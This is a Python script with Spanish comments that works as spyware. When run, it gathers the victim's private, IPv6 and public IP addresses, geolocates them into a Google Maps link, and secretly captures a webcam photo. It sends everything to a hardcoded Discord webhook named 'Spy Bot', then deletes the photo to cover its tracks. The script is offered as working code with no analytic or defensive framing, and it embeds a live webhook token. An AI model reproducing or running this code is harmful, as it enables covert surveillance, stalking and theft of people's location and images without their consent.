import socket
import requests
import cv2
import os

# Obtener IP privada
def get_private_ip():
    try:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
        return private_ip
    except Exception as e:
        return "No se pudo obtener IP privada"

# Obtener IPv6
def get_ipv6():
    try:
        ipv6_info = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)
        ipv6 = ipv6_info[0][4][0] if ipv6_info else "No IPv6 disponible"
        return ipv6
    except Exception as e:
        return "No IPv6 disponible"

# Obtener la IP pública y ubicación
def get_ip_and_location():
    try:
        response = requests.get('http://ip-api.com/json/')
        data = response.json()
        ip = data['query']
        city = data['city']
        country = data['country']
        isp = data['isp']
        lat = data['lat']
        lon = data['lon']
        google_maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        return ip, city, country, isp, google_maps_url
    except Exception as e:
        return None, None, None, None, None

# Función para tomar una foto usando la cámara frontal
def take_photo():
    cam = cv2.VideoCapture(0)  # Usa 0 para cámara principal
    ret, frame = cam.read()
    if ret:
        file_name = "photo.png"
        cv2.imwrite(file_name, frame)  # Guardar la imagen
        cam.release()
        return file_name
    else:
        cam.release()
        return None

# Función para enviar datos al webhook de Discord
def send_to_discord(ip, city, country, isp, google_maps_url, photo_path, webhook_url):
    payload = {
        "content": f"**IP Pública:** {ip}\n**Ciudad:** {city}\n**País:** {country}\n**ISP:** {isp}\n**Google Maps:** {google_maps_url}\n**IP Privada:** {private_ip}\n**IPv6:** {ipv6}",
        "username": "Spy Bot"
    }
    
    files = {'file': open(photo_path, 'rb')} if photo_path else None

    try:
        response = requests.post(webhook_url, data=payload, files=files)
        response.raise_for_status()  # Asegurarse de que la solicitud fue exitosa
    except Exception as e:
        print(f"Error al enviar datos al webhook: {e}")
    finally:
        if files:
            files['file'].close()

# Obtener la IP y geolocalización
ip, city, country, isp, google_maps_url = get_ip_and_location()

# Obtener IP privada e IPv6
private_ip = get_private_ip()
ipv6 = get_ipv6()

# Tomar una foto
photo_path = take_photo()

# URL del webhook de Discord
webhook_url = "https://discord.com/api/webhooks/1285044311339044915/Aii38K2XtAvrJePQTLk5JzNyMb5_2GWGPm-5Nu6Zba2ybt65QWApErpSzoKoZymKyLCR"

# Enviar los datos al webhook de Discord
if ip and photo_path:
    send_to_discord(ip, city, country, isp, google_maps_url, photo_path, webhook_url)
    os.remove(photo_path)  # Eliminar la foto después de enviarla
else:
    print("Error al obtener la información o tomar la foto.")
